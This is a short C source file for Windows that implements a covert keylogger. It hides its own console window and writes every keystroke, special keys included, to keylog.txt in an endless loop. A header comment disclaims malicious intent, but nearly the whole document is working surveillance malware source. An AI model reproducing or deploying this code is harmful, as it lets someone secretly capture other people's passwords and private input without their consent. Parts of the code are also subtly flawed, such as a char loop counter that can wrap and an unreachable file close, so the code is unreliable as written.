// Receives input into keylog.txt until machine turns off
// Not for any malicious intent, entirely just to show the possibilities of <50 lines of code in C

#include <stdio.h>
#include <windows.h>


void hideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

void logKeystrokes() {
    char key;
    FILE *logFile;

    logFile = fopen("keylog.txt", "a+");
    if (logFile == NULL) {
        return;
    }


while (1) {
    Sleep(10); // prevents high cpu usage

    for (key = 8; key <= 190; key++) {
        if (GetAsyncKeyState(key) & 0x0001) { // Check if the key is pressed
        // special key handling
        switch (key) {
            case VK_BACK: fprintf(logFile, "[Backspace]"); break;
            case VK_TAB: fprintf(logFile, "[Tab]"); break;
            case VK_RETURN: fprintf(logFile, "[Enter]"); break;
            case VK_SHIFT: fprintf(logFile, "[Shift]"); break;
            case VK_CONTROL: fprintf(logFile, "[Ctrl]"); break;
            case VK_MENU: fprintf(logFile, "[Alt]"); break;
            case VK_CAPITAL: fprintf(logFile, "[Caps Lock]"); break;
            case VK_ESCAPE: fprintf(logFile, "[Escape]"); break;
            default:
                fprintf(logFile, "%c", key);
                break;
        }
        fflush(logFile);

        }
    }


} fclose(logFile);
}

int main() {
    hideConsole();
    logKeystrokes();
    return 0;
}